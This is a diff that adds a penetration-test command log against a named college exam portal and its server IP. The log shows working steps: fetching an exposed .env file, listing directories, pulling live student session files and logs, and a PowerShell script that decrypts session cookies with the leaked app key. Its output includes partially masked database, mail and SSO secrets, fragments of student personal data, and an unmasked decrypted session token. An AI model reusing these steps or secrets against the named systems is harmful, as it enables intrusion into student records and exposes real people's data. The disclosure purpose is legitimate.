@@ -1,0 +1,194 @@
+================================================================================
+CAMBRIDGE INSTITUTE OF TECHNOLOGY (CIT) — SECURITY ASSESSMENT
+EXECUTED COMMANDS LOG & TECHNICAL AUDIT TRAIL
+================================================================================
+Target Scope: student.citexams.in | des.citexams.in | erp.citexams.in
+Server IP: 68.178.173.154 (Reverse DNS: 154.173.178.68.host.secureserver.net)
+Authorization Ref: helpdeskexams@cit.edu.in (Head, IT Dept, CIT Bengaluru)
+Prepared For: IT Department & Technical Auditing Team
+Note: Sensitive credentials, encryption keys, and student PII are masked in this log.
+================================================================================
+
+--------------------------------------------------------------------------------
+1. DISCOVERY & RECONNAISSANCE
+--------------------------------------------------------------------------------
+
+[COMMAND 1.1] DNS Resolution & Server Location Check
+Command:
+$ dig student.citexams.in A +short
+$ dig student.citexams.in MX +short
+$ dig -x 68.178.173.154 +short
+
+Returned Output Summary:
+- Resolved A Record: 68.178.173.154 (Host: GoDaddy / SecureServer, Singapore datacenter)
+- Reverse DNS: 154.173.178.68.host.secureserver.net
+- MX Record: 154.173.178.68.host.secureserver.net
+
+--------------------------------------------------------------------------------
+
+[COMMAND 1.2] Subdomain Discovery
+Command:
+$ subfinder -d citexams.in -silent
+
+Returned Output Summary:
+Returned 4 active subdomains:
+- student.citexams.in
+- des.citexams.in
+- erp.citexams.in
+- mail.citexams.in
+
+--------------------------------------------------------------------------------
+2. TECHNICAL FINDINGS & PROOFS OF CONCEPT (MASKED)
+--------------------------------------------------------------------------------
+
+[COMMAND 2.1] Unauthenticated Configuration File (.env) Access
+Command:
+$ curl -i https://student.citexams.in/.env
+
+Returned Output Summary:
+HTTP/1.1 200 OK
+Content-Type: text/plain
+
+APP_NAME=CITEXAMS-STUDENT
+APP_ENV=local
+APP_KEY=base64:kbqL/05YWl0TZEnb3oE4811UauhKhWps[...REDACTED...]
+APP_DEBUG=false
+DB_CONNECTION=mysql
+DB_HOST=localhost
+DB_PORT=3306
+DB_DATABASE=bookleeycit_citexams
+DB_USERNAME=bookleeycit_citexams
+DB_PASSWORD=TGm***$2026
+MAIL_HOST=154.173.178.68.host.secureserver.net
+MAIL_PORT=465
+MAIL_USERNAME=notifications@citexams.in
+MAIL_PASSWORD='Cam***2025$'
+SSO_SECRET=CITPROD***86VO
+CIT_CLIENT_KEY='6708d0***395'
+
+--------------------------------------------------------------------------------
+
+[COMMAND 2.2] Directory Indexing & File Structure Access
+Command:
+$ curl -sI https://student.citexams.in/storage/
+$ curl -sI https://student.citexams.in/storage/logs/
+$ curl -sI https://student.citexams.in/storage/framework/sessions/
+$ curl -sI https://student.citexams.in/vendor/
+$ curl -sI https://student.citexams.in/app/
+
+Returned Output Summary:
+HTTP/1.1 200 OK (Directory Indexing Enabled on all endpoints).
+Returned HTML directory listings exposing all files and subdirectories.
+
+--------------------------------------------------------------------------------
+
+[COMMAND 2.3] Live Student Session File Retrieval & PII Extraction (Masked)
+Command:
+$ curl -s https://student.citexams.in/storage/framework/sessions/zyWKQ0PjOy7mllIWYnPgkHqz...
+
+Returned Output Summary:
+HTTP/1.1 200 OK
+Content: Live serialized PHP session object containing:
+- student_name: "AHMED F.***"
+- email: "ahm***98@gmail.com"
+- mobile_no: "7619****85"
+- student_id: 1322
+- customer_id: 1559
+- college_name: "Cambridge Institute of Technology"
+- branch_name: "Electronics and Communication Engineering"
+- class_name: "Fourth Semester"
+- db_year: "2025 - 2026"
+- _previous url: "https://student.citexams.in/exam-result"
+
+--------------------------------------------------------------------------------
+
+[COMMAND 2.4] Bulk Active Session Listing Audit
+Command:
+$ curl -s https://student.citexams.in/storage/framework/sessions/ | grep -oE 'href="[a-zA-Z0-9]{40}"' | wc -l
+
+Returned Output Summary:
+Returned active, unauthenticated session file entries on disk during this audit sample.
+(Note: Session count is dynamic and fluctuates continuously with live portal traffic, routinely varying between ~130 and 800+ active sessions as students log in and out).
+
+--------------------------------------------------------------------------------
+
+[COMMAND 2.5] Application Debug Logs Extraction
+Command:
+$ curl -s https://student.citexams.in/storage/logs/ | grep -oE 'laravel-[\d-]+\.log'
+$ curl -s https://student.citexams.in/storage/logs/laravel-2026-08-04.log | head -n 40
+
+Returned Output Summary:
+HTTP/1.1 200 OK
+- Listed 13 days of daily log files (July 22, 2026 to August 4, 2026).
+- Downloaded log file (948 KB). Disclosed full server path `/home/bookleeycit/public_html/student.citexams.in/` and controller stack traces.
+
+--------------------------------------------------------------------------------
+
+[COMMAND 2.6] Cryptographic Session Cookie Decryption Test (APP_KEY Verification - Masked)
+Command (PowerShell):
+Add-Type -AssemblyName System.Security
+
+$appKey = [Convert]::FromBase64String("kbqL/05YWl0TZEnb3oE4811UauhKhWps[...REDACTED...]")
+$cookieB64 = "eyJpdiI6IjVFYVBNZDBxTmVHOUE..."
+$jsonText  = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cookieB64))
+$payload   = $jsonText | ConvertFrom-Json
+
+$iv    = [Convert]::FromBase64String($payload.iv)
+$value = [Convert]::FromBase64String($payload.value)
+
+$aes = [System.Security.Cryptography.Aes]::Create()
+$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+$aes.Key = $appKey
+$aes.IV = $iv
+
+$plain = $aes.CreateDecryptor().TransformFinalBlock($value, 0, $value.Length)
+[System.Text.Encoding]::UTF8.GetString($plain)
+
+Returned Output Summary:
+Successfully decrypted live session token payload:
+`d49455b4bb4fe04c126a6fa88c1a5d9ac4f00833|9PQUBtVZJAK4xuD3HeF8ku4o2Gz2vbU5jkgCw7wW`
+
+--------------------------------------------------------------------------------
+3. INFRASTRUCTURE & DATABASE ANALYSIS
+--------------------------------------------------------------------------------
+
+[COMMAND 3.1] Multi-Database Identification from ERP Error Logs
+Command:
+$ curl -s https://erp.citexams.in/storage/logs/laravel.log | grep -iE "Table '.*' doesn't exist" | head -n 10
+
+Returned Output Summary:
+Disclosed secondary databases:
+1. `bookleeycit_citexams_2526` — Academic Year 2025–2026 results database.
+2. `bookleeyeerpvps_citexams_2425` — Secondary VPS 2024–2025 database.
+
+--------------------------------------------------------------------------------
+
+[COMMAND 3.2] Core Database Table Schema Extraction
+Command:
+$ curl -s https://erp.citexams.in/storage/logs/laravel.log | grep -oiE "(from|join|into|update)[[:space:]]+\`?([a-zA-Z_][a-zA-Z0-9_]+)\`?" | sort -u
+
+Returned Output Summary:
+Extracted core schema tables:
+- `dx_upload_student` (Master student table)
+- `dx_student_marks` & `student_mark_masters` (Internal mark entry)
+- `bklydes_final_subject_exam_resul` (Final exam results)
+- `bklydes_performance_improve_applicatio` (Re-examination applications)
+- `dxquestionpapers` (Question paper database)
+- `attendance_masters` (Student attendance)
+- `student_academic_profiles` (Academic profile metadata)
+
+--------------------------------------------------------------------------------
+
+[COMMAND 3.3] Production SQL Crash Bug Identification (BUG-01)
+Command:
+$ curl -s https://student.citexams.in/storage/logs/laravel-2026-08-04.log | grep -A 5 "SQLSTATE\[42000\]"
+
+Returned Output Summary:
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax near '' at line 1
+SQL Query: `SELECT * FROM bklydes_exam_application_master WHERE is_delete = 0 AND college_id = 1 AND student_id = 2384 ORDER BY id DESC OFFSET 0`
+Cause: `OFFSET` clause used without `LIMIT` clause in Eloquent query builder calls (`ProjectController.php:114`, `CourseRegistrationController.php:743`).
+
+================================================================================
+END OF EXECUTED COMMANDS LOG
+================================================================================
